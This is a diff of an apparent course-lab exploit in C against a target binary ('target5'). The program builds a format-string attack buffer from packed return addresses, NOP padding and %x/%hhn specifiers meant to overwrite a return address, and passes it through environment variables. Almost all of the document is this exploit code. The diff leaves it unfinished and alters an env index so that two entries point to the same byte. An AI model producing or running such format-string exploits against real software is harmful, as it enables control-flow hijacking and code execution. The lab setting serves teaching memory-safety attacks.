@@ -6,8 +6,6 @@
 
 #define TARGET "../targets/target5"
 
-//const char * payload = "%08x%08x%08x%08x%08x%hhn"; 
-
 int main(void)
 {
   char *args[3];
@@ -33,8 +31,9 @@ int main(void)
    * 	    Acc. to lecture slide, we want <RA><DUMMY NOP><RA+1><DUMMY NOP><RA+2><DUMMY NOP><RA+3><SHELLCODE><%x%hhn...>
    */	
 
+	char exploit[256];
+	memset(exploit, '\x00', 256);
 
-	char exploit[256] = {0};
 	strcat(exploit, "\x68\xfe\x21\x20\x00\x00\x00\x00");
 	strcat(exploit, "\x90\x90\x90\x90\x90\x90\x90\x90");
 	strcat(exploit, "\x69\xfe\x21\x20\x00\x00\x00\x00");
@@ -47,15 +46,9 @@ int main(void)
 
 	// snprintf already used 41 bytes	
 	// Want to write 0x98, 0x1a, 0x21, 0x20
-	//
-	// The difference between current stack pointer (0x20221950)
-	//  and the start address of freeString (0x20221960) is 16
-	//  bytes. Hence, there are two words in between.
-
-	strcat(exploit, "%8x%8x%95d%hhn");	// 152-41-16 = 95
-	strcat(exploit, "%130d%hhn");	// 26 - 152 + 256 = 130
-	strcat(exploit, "%7d%hhn");	// 33 - 26 = 7
-	strcat(exploit, "%1d%hhn");	// 34 - 33 = 1
+	
+	strcat(exploit, "%8x%8x%8x%8x%79x%hhn");	// 6th argument is return address
+	/* Will add others later */
 	
 	int len = strlen(exploit);
 	int j;
@@ -75,7 +68,7 @@ int main(void)
     env[6] = &exploit[22];
     env[7] = &exploit[23];
     env[8] = &exploit[36];
-    env[9] = &exploit[37];
+    env[9] = &exploit[38];
     env[10] = &exploit[38];
     env[11] = &exploit[39];
     env[12] = &exploit[52];
